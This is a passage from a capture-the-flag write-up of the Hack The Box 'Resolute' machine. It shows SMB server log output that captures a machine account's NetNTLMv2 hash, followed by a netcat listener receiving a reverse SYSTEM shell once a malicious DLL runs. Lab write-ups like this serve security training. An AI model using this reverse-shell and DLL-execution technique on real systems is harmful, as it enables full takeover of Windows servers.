[*] Incoming connection (10.10.10.169,57746)
[*] AUTHENTICATE_MESSAGE (MEGABANK\RESOLUTE$,RESOLUTE)
[*] User RESOLUTE$\RESOLUTE authenticated successfully
[*] RESOLUTE$::MEGABANK:4141414141414141:698d51f0e4dcf876f3958d41654c3bf4:01010000000000000023fc7826ecd5019f81e6df0727615a000000000100100051007300570079006d0062005300740002001000540075004300610073006c0058004b000300100051007300570079006d0062005300740004001000540075004300610073006c0058004b00070008000023fc7826ecd501060004000200000008003000300000000000000000000000004000006ada9d8d4c84444925dbfef6b08c4e34be2309dd2bc97aa335d721bf113598f60a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003100340034000000000000000000
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:share)
[*] Disconnecting Share(1:IPC$)
[*] Disconnecting Share(2:share)
[*] Handle: [Errno 104] Connection reset by peer
[*] Closing down connection (10.10.10.169,57746)
[*] Remaining connections []
```

And the DLL is executed, spawning a reverse SYSTEM shell on the nc listener I had set up on the port specified in the DLL creation command:

```aaa
┌─[baud@parrot]─[~/HTB/resolute]
└──╼ $nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.10.14.144] from (UNKNOWN) [10.10.10.169] 57747
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
```


